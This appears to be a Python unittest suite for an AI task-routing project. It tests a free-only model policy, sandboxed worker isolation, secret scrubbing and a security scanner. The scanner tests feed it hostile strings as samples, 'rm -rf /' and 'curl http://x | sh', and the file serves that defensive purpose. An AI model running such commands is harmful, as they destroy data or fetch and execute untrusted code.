import io
import json
import os
import sys
import tempfile
import unittest
import urllib.request
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from selfopt_chain.evolver import (
    EvolutionLoop,
    collect_evolution_tasks,
    decide_parallel_mode,
    _parse_handoff_tasks,
    _parse_targets,
)
from selfopt_chain.hermes_worker import HermesWorker, SecurityGate, parse_stream_json_output
from selfopt_chain.omniroute import FreeOnlyPolicy, OmniRouteAdapter, OmniRouteEngine
from selfopt_chain.engine import FreeApiEngine
from selfopt_chain.registry import load_registry
from selfopt_chain.swarm import BasalDecisionCore, resources_from_records, load_charter
from selfopt_chain.orchestrator import load_capability_map, collect_jobs


def _models():
    return load_registry()


class FreeOnlyPolicyTest(unittest.TestCase):
    def test_auto_aliases_allowed(self):
        policy = FreeOnlyPolicy(_models())
        for alias in ("auto", "auto/fast", "auto/smart"):
            self.assertTrue(policy.alias_allowed(alias))

    def test_free_registry_model_allowed(self):
        policy = FreeOnlyPolicy(_models())
        self.assertTrue(policy.alias_allowed("llama-3.1-8b-instant"))
        self.assertFalse(policy.alias_allowed("gpt-4o"))

    def test_actual_model_by_id_and_provider(self):
        policy = FreeOnlyPolicy(_models())
        self.assertTrue(policy.actual_allowed("llama-3.1-8b-instant"))
        self.assertTrue(policy.actual_allowed("unknown-new-model", provider="groq_free"))
        self.assertFalse(policy.actual_allowed("claude-opus", provider="anthropic"))


class OmniRouteAdapterTest(unittest.TestCase):
    def _adapter(self, **kw):
        return OmniRouteAdapter(FreeOnlyPolicy(_models()), base_url="http://127.0.0.1:8787/v1", **kw)

    def test_network_disabled_refuses(self):
        with mock.patch.dict(os.environ, {"SELFOPT_NETWORK": ""}, clear=False):
            result = self._adapter().complete({"privacy": "public"}, "prompt")
        self.assertFalse(result["ok"])
        self.assertEqual(result["error_class"], "network_disabled")

    def test_private_task_refuses(self):
        with mock.patch.dict(os.environ, {"SELFOPT_NETWORK": "1"}, clear=False):
            result = self._adapter().complete({"privacy": "private"}, "prompt")
        self.assertEqual(result["error_class"], "privacy_violation")

    def test_paid_alias_refuses_before_call(self):
        with mock.patch.dict(os.environ, {"SELFOPT_NETWORK": "1"}, clear=False):
            result = self._adapter().complete({"privacy": "public"}, "prompt", model_alias="gpt-4o")
        self.assertEqual(result["error_class"], "free_only_violation")

    def test_happy_path_returns_real_model(self):
        fake = {"model": "llama-3.1-8b-instant", "choices": [{"message": {"content": "odpowiedz"}}]}
        with mock.patch.dict(os.environ, {"SELFOPT_NETWORK": "1"}, clear=False), \
                mock.patch.object(urllib.request, "urlopen", return_value=io.BytesIO(json.dumps(fake).encode("utf-8"))):
            result = self._adapter().complete({"privacy": "public"}, "prompt", model_alias="auto")
        self.assertTrue(result["ok"])
        self.assertEqual(result["model_id"], "llama-3.1-8b-instant")
        self.assertEqual(result["provider"], "omniroute")
        self.assertGreaterEqual(result["latency_ms"], 0)

    def test_paid_actual_model_rejected_after_response(self):
        fake = {"model": "claude-opus-4", "choices": [{"message": {"content": "x"}}]}
        with mock.patch.dict(os.environ, {"SELFOPT_NETWORK": "1"}, clear=False), \
                mock.patch.object(urllib.request, "urlopen", return_value=io.BytesIO(json.dumps(fake).encode("utf-8"))):
            result = self._adapter().complete({"privacy": "public"}, "prompt")
        self.assertFalse(result["ok"])
        self.assertEqual(result["error_class"], "free_only_violation")
        self.assertIn("FREE-ONLY", result["error"])

    def test_api_key_sent_as_bearer(self):
        fake = {"model": "llama-3.1-8b-instant", "choices": [{"message": {"content": "odp"}}]}
        with mock.patch.dict(os.environ, {"SELFOPT_NETWORK": "1", "SELFOPT_OMNIROUTE_KEY": "sk-test-123"}, clear=False), \
                mock.patch.object(urllib.request, "urlopen", return_value=io.BytesIO(json.dumps(fake).encode("utf-8"))) as urlopen:
            adapter = OmniRouteAdapter(FreeOnlyPolicy(_models()), base_url="http://127.0.0.1:20128/v1")
            result = adapter.complete({"privacy": "public"}, "prompt")
        self.assertTrue(result["ok"])
        req = urlopen.call_args[0][0]
        self.assertEqual(req.headers.get("Authorization"), "Bearer sk-test-123")

    def test_free_catalog_extends_policy(self):
        catalog = {"data": [{"id": "mistral/dev-test", "owned_by": "mistral_free"}, {"id": "paid/x", "owned_by": "anthropic"}]}
        fake = {"model": "mistral/dev-test", "choices": [{"message": {"content": "odp"}}]}

        class FakeResp(io.BytesIO):
            def __enter__(self):
                return self

        responses = [FakeResp(json.dumps(catalog).encode("utf-8")), FakeResp(json.dumps(fake).encode("utf-8"))]
        with mock.patch.dict(os.environ, {"SELFOPT_NETWORK": "1"}, clear=False), \
                mock.patch.object(urllib.request, "urlopen", side_effect=responses):
            engine = OmniRouteEngine(_models(), base_url="http://127.0.0.1:20128/v1")
            result = engine.complete({"privacy": "public"}, "mistral/dev-test", "prompt")
        self.assertTrue(result["ok"])
        self.assertEqual(result["model_id"], "mistral/dev-test")

    def test_engine_falls_back_to_auto_for_unknown_model(self):
        catalog = {"data": []}
        fake = {"model": "llama-3.1-8b-instant", "choices": [{"message": {"content": "odp"}}]}

        class FakeResp(io.BytesIO):
            def __enter__(self):
                return self

        responses = [FakeResp(json.dumps(catalog).encode("utf-8")), FakeResp(json.dumps(fake).encode("utf-8"))]
        with mock.patch.dict(os.environ, {"SELFOPT_NETWORK": "1"}, clear=False), \
                mock.patch.object(urllib.request, "urlopen", side_effect=responses):
            engine = OmniRouteEngine(_models(), base_url="http://127.0.0.1:20128/v1")
            result = engine.complete({"privacy": "public"}, "model-spoza-rejestru", "prompt")
        self.assertTrue(result["ok"])
        self.assertEqual(result["requested_alias"], "ddgw/mistral-small-2603")


class BasalRemoteEngineTest(unittest.TestCase):
    def test_remote_decision_used_when_available(self):
        payload = {"answers": {"decision": {"choice": "b", "probabilities": {"a": 0.2, "b": 0.8}, "confidence": 0.91}}}
        with mock.patch.dict(os.environ, {"SELFOPT_BASAL_URL": "http://127.0.0.1:8000"}, clear=False), \
                mock.patch.object(urllib.request, "urlopen", return_value=io.BytesIO(json.dumps(payload).encode("utf-8"))):
            core = BasalDecisionCore()
            decision = core.decide("choice", ["a", "b"], {"a": 3.0, "b": 1.0}, default_option="a")
        self.assertEqual(decision["engine"], "basal-serve")
        self.assertEqual(decision["chosen"], "b")
        self.assertEqual(decision["confidence"], 0.91)

    def test_remote_failure_falls_back_to_builtin(self):
        def boom(*args, **kwargs):
            raise OSError("basal-serve nieosiagalny")

        with mock.patch.dict(os.environ, {"SELFOPT_BASAL_URL": "http://127.0.0.1:8000"}, clear=False), \
                mock.patch.object(urllib.request, "urlopen", side_effect=boom):
            core = BasalDecisionCore()
            decision = core.decide("choice", ["a", "b"], {"a": 3.0, "b": 1.0}, default_option="a")
        self.assertEqual(decision["engine"], "builtin")
        self.assertIn("basal-serve", decision["remote_note"])
        self.assertEqual(decision["chosen"], "a")

    def test_builtin_when_no_url(self):
        env = {k: v for k, v in os.environ.items() if k != "SELFOPT_BASAL_URL"}
        with mock.patch.dict(os.environ, env, clear=True):
            core = BasalDecisionCore()
            decision = core.decide("choice", ["a"], {"a": 1.0})
        self.assertEqual(decision["engine"], "builtin")
        self.assertIsNone(decision["remote_note"])


class HermesIsolationTest(unittest.TestCase):
    def test_sandbox_paths_are_absolute(self):
        worker = HermesWorker()
        sandbox = worker.sandbox_dir("abs_check")
        quarantine = worker.quarantine_dir("abs_check")
        self.assertTrue(sandbox.is_absolute())
        self.assertTrue(quarantine.is_absolute())
        self.assertTrue(sandbox.exists() and quarantine.exists())

    def test_command_uses_isolation_flags(self):
        worker = HermesWorker(omniroute_base_url="http://127.0.0.1:20128/v1")
        with tempfile.TemporaryDirectory() as tmp:
            run_dir = Path(tmp) / "run"
            run_dir.mkdir()
            task = worker.write_task_file("r1", "task.md", "# zadanie")
            command = worker.build_command(task, run_dir)
        flags = " ".join(command)
        for flag in ("--safe-mode", "--in", "--oneshot", "--query-file", "--max-turns", "--format stream-json", "--base-url"):
            self.assertIn(flag, flags)
        self.assertNotIn("--worktree", flags)
        self.assertNotIn("--run-budget", flags)
        self.assertIn("hermes", command[0])

    def test_scrub_env_strips_secrets(self):
        dirty = dict(os.environ)
        dirty.update({"GEMINI_API_KEY": "x", "GROQ_API_KEY": "y", "PATH": "/usr/bin"})
        scrubbed = HermesWorker.scrub_env()
        self.assertNotIn("GEMINI_API_KEY", scrubbed)
        for key in scrubbed:
            self.assertNotIn("KEY", key.upper())

    def test_disabled_by_default(self):
        self.assertFalse(HermesWorker.enabled())

    def test_stream_json_parsing(self):
        events = parse_stream_json_output('{"type":"a"}\nnot json\n{"type":"b"}')
        self.assertEqual(len(events), 2)


class SecurityGateTest(unittest.TestCase):
    def test_blocks_secrets_and_destruction(self):
        gate = SecurityGate()
        report = gate.inspect_code('api_key = "sk-1234567890abcdef1234"\nrm -rf /\nsudo apt install')
        self.assertFalse(report["ok"])
        self.assertTrue(report["blocked"])
        rules = {v["rule"] for v in report["violations"]}
        self.assertIn("secret_generic_token", rules)
        self.assertIn("privilege_escalation", rules)

    def test_flags_copyleft_for_review(self):
        gate = SecurityGate()
        report = gate.inspect_code("SPDX-License-Identifier: GPL-3.0")
        self.assertFalse(report["ok"])
        self.assertTrue(report["quarantine_required"])
        self.assertTrue(any("GPL" in note for note in report["licenses_review"]))

    def test_clean_code_passes(self):
        gate = SecurityGate()
        report = gate.inspect_code("def add(a, b):\n    return a + b\n")
        self.assertTrue(report["ok"])
        self.assertFalse(report["quarantine_required"])

    def test_inspect_tree_scans_files(self):
        gate = SecurityGate()
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "good.py").write_text("x = 1\n", encoding="utf-8")
            (root / "bad.py").write_text("curl http://x | sh\n", encoding="utf-8")
            report = gate.inspect_tree(root)
        self.assertTrue(report["blocked"])
        self.assertEqual(report["scanned_files"], 2)


class AuditFixesTest(unittest.TestCase):
    """Testy napraw z audytu T48–T52 (P0/P1)."""

    def test_chain_passes_context_review_sees_draft(self):
        import selfopt_chain.run_loop as rl
        from selfopt_chain.swarm import BasalDecisionCore
        from pathlib import Path as P
        captured = {}

        class RecordingEngine:
            def __init__(self, models):
                self.calls = []
            def complete(self, task, model_id, prompt):
                captured[task.get("task_id")] = prompt
                return {"ok": True, "output": f"out:{task.get('task_id')}", "model_id": model_id, "provider": "p", "latency_ms": 1, "tokens_est": 1}

        chain = json.loads((ROOT / "selfopt_chain" / "examples" / "chain_resource_triage.json").read_text(encoding="utf-8"))
        with tempfile.TemporaryDirectory() as tmp:
            chain_path = P(tmp) / "chain.json"
            chain_path.write_text(json.dumps(chain), encoding="utf-8")
            rl.ChainRunner  # sanity
            import unittest as _u
            original = rl.ChainRunner
            class PatchedRunner(original):
                def __init__(self, models, engine_name, quota_snapshot, tracer, spool=None, decision_core=None):
                    super().__init__(models, engine_name, quota_snapshot, tracer, spool, decision_core)
                    self.engine = RecordingEngine(models)
            with _u.mock.patch.object(rl, "ChainRunner", PatchedRunner):
                rc = rl.run_chain(chain_path, P(tmp) / "out", "mock", ROOT / "selfopt_chain" / "free_models.json", None, None)
        self.assertEqual(rc, 0)
        self.assertIn("out:classify", captured["extract"], "extract ma widzieć wynik classify")
        self.assertIn("out:draft", captured["review"], "review ma widzieć draft")

    def test_degraded_status_on_partial_failure(self):
        import selfopt_chain.run_loop as rl
        from pathlib import Path as P
        chain = json.loads((ROOT / "selfopt_chain" / "examples" / "chain_resource_triage.json").read_text(encoding="utf-8"))
        with tempfile.TemporaryDirectory() as tmp:
            chain_path = P(tmp) / "chain.json"
            chain_path.write_text(json.dumps(chain), encoding="utf-8")
            import unittest as _u
            original = rl.ChainRunner
            class FailingEngineRunner(original):
                def __init__(self, models, engine_name, quota_snapshot, tracer, spool=None, decision_core=None):
                    super().__init__(models, engine_name, quota_snapshot, tracer, spool, decision_core)
                    from selfopt_chain.engine import MockEngine
                    self.engine = MockEngine(models, fail_kinds={"extract"})
            with _u.mock.patch.object(rl, "ChainRunner", FailingEngineRunner):
                rc = rl.run_chain(chain_path, P(tmp) / "out", "mock", ROOT / "selfopt_chain" / "free_models.json", None, None)
            receipt = json.loads((P(tmp) / "out" / "run_receipt.json").read_text(encoding="utf-8"))
        self.assertEqual(rc, 1)
        self.assertIn("degraded", receipt["status"])

    def test_record_calls_counts_calls_not_models(self):
        from selfopt_chain.orchestrator import OrchestratorState
        state = OrchestratorState(Path(tempfile.mkdtemp()))
        state.record_calls({"model-a": 5, "model-b": 0})
        state.record_calls({"model-a": 3})
        self.assertEqual(state.data["daily_calls"]["model-a"], 8)
        self.assertEqual(state.data["daily_calls"].get("model-b", 0), 0)

    def test_charter_word_boundaries_no_false_positives(self):
        charter = load_charter()
        ok_text = "Wytwarzanie obudow z odzysku oraz bronowanie sali warsztatowej dla spolecznosci"
        bad = SecurityGate()
        from selfopt_chain.swarm import Demand as D, charter_check
        good = D("n1", ok_text, ["assembly"], "human_needs", payload={"mission_classes": ["production", "food"]})
        self.assertTrue(charter_check([good], charter)["ok"], "wytwarzanie/bronowanie NIE moga byc blokowane")
        weapon = D("n2", "potrzebna broń i amunicja do testow", [], "human_needs", payload={"mission_classes": ["safety"]})
        self.assertFalse(charter_check([weapon], charter)["ok"], "broń musi byc zablokowana")
        face = D("n3", "system rozpoznawania twarzy na osiedlu", ["vision"], "human_needs", payload={"mission_classes": ["sensing"]})
        self.assertFalse(charter_check([face], charter)["ok"])

    def test_private_inbox_job_privacy_end_to_end(self):
        with tempfile.TemporaryDirectory() as tmp:
            inbox = Path(tmp)
            (inbox / "m1.json").write_text(json.dumps({"origin_network": "MESHTASTIC", "payload_text": "[EDGE→HUB] temp 27C"}), encoding="utf-8")
            jobs = collect_jobs([], inbox)
        self.assertEqual(jobs[0].privacy, "private")

    def test_engine_local_style_uses_env_base(self):
        fake = {"choices": [{"message": {"content": "lokalna odpowiedz"}}]}
        with mock.patch.dict(os.environ, {"SELFOPT_NETWORK": "1", "SELFHOST_AI_BASE_URL": "http://127.0.0.1:9999"}, clear=False), \
                mock.patch.object(urllib.request, "urlopen", return_value=io.BytesIO(json.dumps(fake).encode("utf-8"))) as urlopen:
            engine = FreeApiEngine(load_registry())
            result = engine.complete({"privacy": "private"}, "small-instruct", "prompt")
        self.assertTrue(result["ok"])
        self.assertIn("127.0.0.1:9999", urlopen.call_args[0][0].full_url)
        self.assertNotIn("Authorization", urlopen.call_args[0][0].headers)

    def test_engine_local_style_fail_closed_without_env(self):
        env = {"SELFOPT_NETWORK": "1"}
        with mock.patch.dict(os.environ, env, clear=False), \
                mock.patch.dict("os.environ", {"SELFHOST_AI_BASE_URL": ""}, clear=False):
            engine = FreeApiEngine(load_registry())
            result = engine.complete({"privacy": "private"}, "small-instruct", "prompt")
        self.assertFalse(result["ok"])
        self.assertIn(result["error_class"], {"missing_secret", "connection_error"})

    def test_gate_fail_closed_on_zero_artifacts(self):
        gate = SecurityGate()
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "output.json").write_text("{}", encoding="utf-8")
            report = gate.inspect_tree(Path(tmp), skip={"output.json"})
        self.assertFalse(report["ok"])
        self.assertTrue(any(v["rule"] == "no_artifacts_produced" for v in report["violations"]))

    def test_hermes_command_key_redacted_in_receipt(self):
        worker = HermesWorker(api_key="sk-SECRET-123")
        with tempfile.TemporaryDirectory() as tmp:
            run_dir = Path(tmp) / "run"
            run_dir.mkdir()
            task = worker.write_task_file("r", "task.md", "# t")
            receipt = worker.run_isolated("# t")
        serialized = json.dumps(receipt, default=str)
        self.assertNotIn("sk-SECRET-123", serialized)
        self.assertIn("[REDACTED]", serialized)

    def test_calibration_accumulates_from_previous(self):
        from selfopt_chain.calibrate import fit_temperatures
        decisions = [{"id": "d1", "question_type": "strategy", "deferred": False, "confidence": 0.6, "chosen": "x", "final": "x"}]
        labels = [{"decision_id": "d1", "accepted": True}]
        first = fit_temperatures(decisions, labels, base={"strategy": 1.0})
        second = fit_temperatures(decisions, labels, base=first["temperature_per_prim"])
        self.assertLessEqual(second["temperature_per_prim"]["strategy"], first["temperature_per_prim"]["strategy"])

    def test_evolution_dedup_across_cycles(self):
        with tempfile.TemporaryDirectory() as tmp:
            state = Path(tmp) / "state"
            loop = EvolutionLoop(state, ROOT / "docs", ROOT, worker=None)
            first = loop.run(max_tasks=2, parallel_mode="single")
            second = loop.run(max_tasks=2, parallel_mode="single")
            self.assertTrue(first)
            first_ids = {t["task_id"] for t in first}
            second_ids = {t["task_id"] for t in second}
            self.assertFalse(first_ids & second_ids, "zadnia z pierwszej tury nie moze powtorzyc sie w drugiej")


class EvolverStrategyTest(unittest.TestCase):
    def _task(self, tid, title):
        from selfopt_chain.evolver import EvolutionTask
        return EvolutionTask(task_id=tid, title=title, source="test")

    def test_strategy_llm_prioritizes_and_atomizes(self):
        from selfopt_chain.evolver import generate_llm_strategy

        class FakeEngine:
            def complete(self, task, model_alias, prompt):
                return {"ok": True, "model_id": "auto/best-reasoning", "output": json.dumps({
                    "brief": "Najpierw baza części, potem mechanika.",
                    "priorities": ["t_b", "t_a"],
                    "model_hints": {"t_b": "smart"},
                    "subtasks": [
                        {"task_id": "sub_1", "title": "Kontrakt ProcessAtom v1", "context": "pola + walidacja", "parent": "t_b"},
                        {"task_id": "t_a", "title": "duplikat — odrzucony", "context": "", "parent": "t_b"},
                    ],
                })}

        tasks = [self._task("t_a", "zadanie A"), self._task("t_b", "zadanie B")]
        strategy, subtasks = generate_llm_strategy(tasks, FakeEngine())
        self.assertEqual(strategy["priorities"], ["t_b", "t_a"])
        self.assertEqual(len(subtasks), 1)
        self.assertEqual(subtasks[0].task_id, "sub_1")

    def test_strategy_fallback_without_engine(self):
        from selfopt_chain.evolver import generate_llm_strategy

        strategy, subtasks = generate_llm_strategy([self._task("t_a", "x")], None)
        self.assertEqual(strategy["source"], "deterministic_fallback")
        self.assertEqual(subtasks, [])

    def test_review_by_strong_model_verdicts(self):
        from selfopt_chain.evolver import review_by_strong_model, DEFAULT_REVIEW_ALIAS

        class FakeReviewEngine:
            def complete(self, task, model_alias, prompt):
                assert model_alias == DEFAULT_REVIEW_ALIAS
                return {"ok": True, "model_id": "reviewer-strong", "output": '{"verdict": "needs_fixes", "notes": "brakuje testów"}'}

        task = self._task("t_a", "sprawdź produkcję")
        review = review_by_strong_model(task, "jakaś produkcja", FakeReviewEngine())
        self.assertEqual(review["verdict"], "needs_fixes")
        self.assertIn("brakuje testów", review["notes"])
        self.assertEqual(review_by_strong_model(task, "x", None)["verdict"], "unreviewed")

    def test_review_offline_marks_unreviewed(self):
        from selfopt_chain.evolver import EvolutionLoop

        with tempfile.TemporaryDirectory() as tmp:
            state = Path(tmp) / "state"
            loop = EvolutionLoop(state, ROOT / "docs", ROOT, worker=None)
            receipts = loop.run(max_tasks=1, parallel_mode="single")
            self.assertEqual(receipts[0]["review"]["verdict"], "unreviewed")


class EvolverTest(unittest.TestCase):
    def test_handoff_tasks_parsed_from_real_docs(self):
        tasks = _parse_handoff_tasks(ROOT / "docs")
        self.assertTrue(tasks, "repo ma handoffy z sekcją 'Następne zadania'")
        self.assertTrue(all(t.title.startswith("T") or "T" in t.title for t in tasks))

    def test_targets_load(self):
        tasks = _parse_targets()
        self.assertGreaterEqual(len(tasks), 4)
        self.assertTrue(any(t.task_id == "target_router_weights_from_decisions" for t in tasks))

    def test_collect_dedup_and_limit(self):
        with tempfile.TemporaryDirectory() as tmp:
            tasks = collect_evolution_tasks(Path(tmp), ROOT / "docs", max_tasks=3)
        ids = [t.task_id for t in tasks]
        self.assertEqual(len(ids), len(set(ids)))
        self.assertEqual(len(tasks), 3)

    def test_parallel_mode_decisions(self):
        self.assertEqual(decide_parallel_mode(BasalDecisionCore(), backlog=0, critical=0), "single")
        self.assertEqual(decide_parallel_mode(BasalDecisionCore(), backlog=6, critical=0), "wide")
        self.assertEqual(decide_parallel_mode(BasalDecisionCore(), backlog=0, critical=3), "deep")

    def test_evolution_loop_mock_lane_creates_proposals(self):
        with tempfile.TemporaryDirectory() as tmp:
            state = Path(tmp) / "state"
            loop = EvolutionLoop(state, ROOT / "docs", ROOT, worker=None)
            receipts = loop.run(max_tasks=2, parallel_mode="single")
            self.assertEqual(len(receipts), 2)
            for receipt in receipts:
                self.assertEqual(receipt["executor"], "mock")
                self.assertTrue(receipt["gate_ok"])
                self.assertFalse(receipt["auto_applied"])
                proposal = Path(receipt["proposal_path"])
                self.assertTrue(proposal.exists())
                text = proposal.read_text(encoding="utf-8")
                self.assertIn("suggest-only", text)
                gate_report = proposal.parent / "gate_report.json"
                self.assertTrue(gate_report.exists())


class SwarmResourceClassesTest(unittest.TestCase):
    def test_appliance_sensors_and_esp_classes(self):
        records = [
            {"id": "s1", "resource_class": "appliance_sensors", "cost": {"amount_pln": 0}, "location": {}, "risks": [], "required_evidence": [], "activation_requirements": {}},
            {"id": "e1", "resource_class": "esp_boards", "cost": {"amount_pln": 0}, "location": {}, "risks": [], "required_evidence": [], "activation_requirements": {}},
        ]
        resources = resources_from_records(records)
        sensors = next(r for r in resources if r.resource_id.startswith("hardware:appliance_sensor"))
        esp = next(r for r in resources if r.resource_id.startswith("hardware:esp"))
        self.assertIn("water_level", sensors.capabilities)
        self.assertIn("temperature", sensors.capabilities)
        self.assertIn("control", esp.capabilities)

    def test_capability_map_covers_new_classes(self):
        map_data = load_capability_map(ROOT / "selfopt_chain" / "capability_map.json")
        self.assertIn("appliance_sensors", map_data["classes"])
        self.assertIn("esp_boards", map_data["classes"])


if __name__ == "__main__":
    unittest.main()
